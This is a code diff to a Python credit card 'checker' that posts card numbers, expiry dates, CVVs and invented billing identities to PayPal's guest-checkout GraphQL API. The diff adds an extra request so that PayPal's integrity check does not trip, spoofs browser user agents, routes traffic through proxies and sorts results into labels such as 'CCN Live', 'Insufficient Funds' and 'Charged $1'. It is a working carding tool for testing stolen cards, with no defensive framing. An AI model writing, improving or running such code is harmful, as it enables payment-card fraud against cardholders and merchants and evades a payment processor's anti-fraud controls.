@@ -19,11 +19,11 @@ PAYPAL_TIMEOUT = 20
 PROXY_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "proxy.txt")
 
 UA_LIST = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
 ]
 
 
@@ -202,57 +202,137 @@ async def ppnormal_check(cc, mm, yy, cvv, proxy=None):
         elapsed = round(time.time() - start, 2)
         return f"Error - {last_error or 'Site unreachable'} [{elapsed}s]"
 
-    gql = {
-        "query": """mutation payWithCard($token: String!, $card: CardInput!, $email: String, $billingAddress: AddressInput) {
-            approveGuestPaymentWithCreditCard(token: $token, card: $card, email: $email, billingAddress: $billingAddress) {
-                flags { is3DSecureRequired }
-            }
-        }""",
-        "variables": {
-            "token": order_id,
-            "card": {
-                "cardNumber": cc,
-                "expirationDate": exp_date,
-                "securityCode": cvv,
-                "postalCode": zipcode,
-            },
-            "email": email,
-            "billingAddress": {
-                "givenName": first,
-                "familyName": last,
-                "line1": street,
-                "city": city,
-                "state": state,
-                "postalCode": zipcode,
-                "country": "US",
-            },
-        },
-        "operationName": "payWithCard",
+    pp_proxy = working_proxy or _get_global_proxy()
+    pp_kwargs = {
+        "timeout": httpx.Timeout(PAYPAL_TIMEOUT),
+        "follow_redirects": True,
+        "verify": False,
+    }
+    if pp_proxy:
+        pp_kwargs["proxy"] = pp_proxy
+
+    pp_headers_base = {
+        "accept": "application/json",
+        "content-type": "application/json",
+        "origin": "https://www.paypal.com",
+        "referer": "https://www.paypal.com/",
+        "sec-ch-ua": '"Chromium";v="138", "Not/A)Brand";v="24"',
+        "sec-ch-ua-mobile": "?1",
+        "sec-ch-ua-platform": '"Android"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": ua,
+        "paypal-client-context": order_id,
+        "x-app-name": "smart-payment-buttons",
     }
 
     for attempt in range(2):
         try:
-            async with httpx.AsyncClient(
-                timeout=httpx.Timeout(PAYPAL_TIMEOUT),
-                verify=False,
-                follow_redirects=True,
-            ) as pp_client:
-                r_gql = await pp_client.post(
-                    PAYPAL_GQL,
-                    json=gql,
-                    headers={
-                        "Content-Type": "application/json",
-                        "Origin": "https://www.paypal.com",
-                        "User-Agent": ua,
+            async with httpx.AsyncClient(**pp_kwargs) as pp_client:
+                # Step 1: UpdateClientConfig (required by PayPal to avoid integrity check failure)
+                update_config = {
+                    "query": """
+                        mutation UpdateClientConfig(
+                            $orderID : String!,
+                            $fundingSource : ButtonFundingSourceType!,
+                            $integrationArtifact : IntegrationArtifactType!,
+                            $userExperienceFlow : UserExperienceFlowType!,
+                            $productFlow : ProductFlowType!,
+                            $buttonSessionID : String
+                        ) {
+                            updateClientConfig(
+                                token: $orderID,
+                                fundingSource: $fundingSource,
+                                integrationArtifact: $integrationArtifact,
+                                userExperienceFlow: $userExperienceFlow,
+                                productFlow: $productFlow,
+                                buttonSessionID: $buttonSessionID
+                            )
+                        }
+                    """,
+                    "variables": {
+                        "orderID": order_id,
+                        "fundingSource": "card",
+                        "integrationArtifact": "PAYPAL_JS_SDK",
+                        "userExperienceFlow": "INLINE",
+                        "productFlow": "SMART_PAYMENT_BUTTONS",
                     },
+                }
+                await pp_client.post(
+                    f"{PAYPAL_GQL}?UpdateClientConfig",
+                    headers=pp_headers_base,
+                    json=update_config,
+                )
+
+                # Step 2: Submit card payment
+                card_headers = {
+                    "content-type": "application/json",
+                    "origin": "https://www.paypal.com",
+                    "referer": "https://www.paypal.com/",
+                    "sec-ch-ua": '"Chromium";v="138", "Not/A)Brand";v="24"',
+                    "sec-ch-ua-mobile": "?1",
+                    "sec-ch-ua-platform": '"Android"',
+                    "user-agent": ua,
+                    "paypal-client-metadata-id": order_id,
+                    "paypal-client-context": order_id,
+                    "x-app-name": "standardcardfields",
+                    "x-country": "US",
+                }
+
+                gql = {
+                    "query": """mutation payWithCard($token: String!, $card: CardInput!, $email: String, $billingAddress: AddressInput, $phoneNumber: String, $firstName: String, $lastName: String, $shippingAddress: AddressInput, $currencyConversionType: CheckoutCurrencyConversionType) {
+                        approveGuestPaymentWithCreditCard(token: $token, card: $card, email: $email, billingAddress: $billingAddress, phoneNumber: $phoneNumber, firstName: $firstName, lastName: $lastName, shippingAddress: $shippingAddress, currencyConversionType: $currencyConversionType) {
+                            flags { is3DSecureRequired }
+                            paymentContingencies { threeDomainSecure { status } }
+                        }
+                    }""",
+                    "variables": {
+                        "token": order_id,
+                        "card": {
+                            "cardNumber": cc,
+                            "expirationDate": exp_date,
+                            "securityCode": cvv,
+                            "postalCode": zipcode,
+                        },
+                        "email": email,
+                        "firstName": first,
+                        "lastName": last,
+                        "phoneNumber": phone,
+                        "billingAddress": {
+                            "givenName": first,
+                            "familyName": last,
+                            "line1": street,
+                            "line2": None,
+                            "city": city,
+                            "state": state,
+                            "postalCode": zipcode,
+                            "country": "US",
+                        },
+                        "shippingAddress": {
+                            "givenName": first,
+                            "familyName": last,
+                            "line1": street,
+                            "line2": None,
+                            "city": city,
+                            "state": state,
+                            "postalCode": zipcode,
+                            "country": "US",
+                        },
+                        "currencyConversionType": "PAYPAL",
+                    },
+                    "operationName": "payWithCard",
+                }
+
+                r_gql = await pp_client.post(
+                    f"{PAYPAL_GQL}?fetch_credit_form_submit",
+                    headers=card_headers,
+                    json=gql,
                 )
                 result = r_gql.json()
                 elapsed = round(time.time() - start, 2)
 
                 txt = json.dumps(result).lower()
-
-                if "thank you" in txt or "success" in txt:
-                    return f"Approved - Charged $1 | {cc[:6]} [{elapsed}s]"
 
                 if "is3dsecurerequired" in txt:
                     flags = (
@@ -273,8 +353,8 @@ async def ppnormal_check(cc, mm, yy, cvv, proxy=None):
                         tag = indicator.replace("_", " ").title()
                         return f"Approved - {tag} | {cc[:6]} [{elapsed}s]"
 
-                if "incorrect_cvv" in txt or "invalid_security_code" in txt:
-                    return f"Approved - CCN Live | {cc[:6]} [{elapsed}s]"
+                if "incorrect_cvv" in txt or "invalid_security_code" in txt or "cvv2_failure" in txt:
+                    return f"Approved - CCN Live (CVV) | {cc[:6]} [{elapsed}s]"
 
                 if "processor_declined" in txt or "issuer_decline" in txt:
                     return f"Declined - Issuer Decline | {cc[:6]} [{elapsed}s]"
@@ -291,11 +371,28 @@ async def ppnormal_check(cc, mm, yy, cvv, proxy=None):
                 errors = result.get("errors", [])
                 if errors:
                     msg = errors[0].get("message", "Unknown")
-                    retryable_words = ["internal", "timeout", "unavailable", "server"]
+                    err_data = errors[0].get("data", [])
+                    if isinstance(err_data, list) and err_data:
+                        code = err_data[0].get("code", "")
+                        if code:
+                            if code in ("INSUFFICIENT_FUNDS", "CVV2_FAILURE", "INVALID_SECURITY_CODE"):
+                                return f"Approved - {code} | {cc[:6]} [{elapsed}s]"
+                            return f"Declined - {code} | {cc[:6]} [{elapsed}s]"
+                    details = errors[0].get("details", [])
+                    if isinstance(details, list) and details:
+                        issue = details[0].get("issue", "")
+                        if issue:
+                            return f"Declined - {issue} | {cc[:6]} [{elapsed}s]"
+                    retryable_words = ["internal", "timeout", "unavailable", "server", "integrity"]
                     if any(w in msg.lower() for w in retryable_words) and attempt < 1:
                         await asyncio.sleep(random.uniform(0.5, 1.5))
                         continue
                     return f"Declined - {msg[:60]} | {cc[:6]} [{elapsed}s]"
+
+                data = result.get("data", {})
+                approve = data.get("approveGuestPaymentWithCreditCard")
+                if approve is not None:
+                    return f"Approved - Charged $1 | {cc[:6]} [{elapsed}s]"
 
                 return f"Declined - Unknown Response | {cc[:6]} [{elapsed}s]"
 
